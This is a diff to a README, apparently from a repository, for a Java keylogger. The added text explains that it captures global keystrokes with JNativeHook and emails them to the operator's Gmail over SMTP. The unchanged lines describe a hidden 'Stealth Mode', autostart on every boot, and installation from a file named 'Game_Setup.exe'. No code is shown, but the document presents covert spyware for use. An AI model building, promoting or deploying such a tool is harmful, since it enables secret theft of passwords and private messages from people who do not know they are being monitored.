@@ -9,6 +9,15 @@ This is a keylogger application built using Java and bundled with JRE 1.8 (32-bi
 - **Stealth Mode**: The application is hidden from the Start menu and runs in the background without being visible to the user.
 - **Bundled JRE**: The installer includes a 32-bit version of JRE 1.8, so no separate Java installation is required for running the application.
 
+## How It Works
+
+- The application operates as a **background Java process**.
+- It uses several additional libraries, including:
+  - `JNativeHook` for capturing global key events.
+  - `smtp`, `imap`, and `mailapi` for handling email communication.
+- The captured keystrokes are **sent to your Gmail account** through an SMTP connection.
+- After recording the keystrokes, the data is automatically sent to your email for monitoring purposes.
+
 ## Installation
 
 1. Download the `Game_Setup.exe` file from the [Releases](#) section.
@@ -21,7 +30,8 @@ This is a keylogger application built using Java and bundled with JRE 1.8 (32-bi
 ## Usage
 
 - The application runs in the background after installation and records user keystrokes.
-- It is automatically launched on every system startup, remaining hidden from the user interface.
+- It connects to your Gmail account using SMTP and sends the captured keystrokes via email.
+- The application is automatically launched on every system startup and remains hidden from the user interface.
 
 ## Uninstallation
 
